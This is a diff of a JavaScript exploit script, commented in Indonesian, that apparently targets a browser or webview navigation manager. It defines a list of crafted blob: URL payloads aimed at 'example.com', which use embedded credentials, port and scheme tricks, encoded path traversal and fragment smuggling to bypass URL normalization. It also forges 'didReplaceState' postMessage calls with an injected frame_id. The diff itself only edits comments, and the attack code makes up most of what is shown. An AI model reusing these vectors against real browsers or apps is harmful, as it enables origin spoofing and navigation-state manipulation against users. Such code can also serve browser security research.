@@ -36,14 +36,13 @@
 (function() {
     const TARGET_VICTIM = "example.com";
     
-    // Kumpulan vektor tingkat lanjut untuk menguji celah logika asinkron & normalisasi URL
+    // Vektor uji tingkat lanjut untuk menguji celah normalisasi URL & deserialisasi state
     const payloadVectors = [
         "blob:https://" + TARGET_VICTIM + "/path-standard-bypass",
         "blob:https://user:pass@" + TARGET_VICTIM + "/auth-trick",
         "blob:https://" + TARGET_VICTIM + ":443/port-spec",
         "blob:http://" + TARGET_VICTIM + "/cross-scheme-attempt",
         "blob:https://" + TARGET_VICTIM + "%2f%2e%2e%2f%2e%2e",
-        // Mencoba menyusupkan state kosong atau manipulasi parameter navigasi manager
         "blob:https://" + TARGET_VICTIM + "/#fragment-smuggling"
     ];
 
@@ -118,7 +117,7 @@
                     frame_id: frameId
                 });
 
-                // Memaksa pengiriman state dengan menyertakan parameter tambahan
+                // Memaksa pengiriman state dengan menyertakan objek bersarang
                 mh.NavigationEventMessage.postMessage({
                     command: 'didReplaceState',
                     frame_id: frameId,
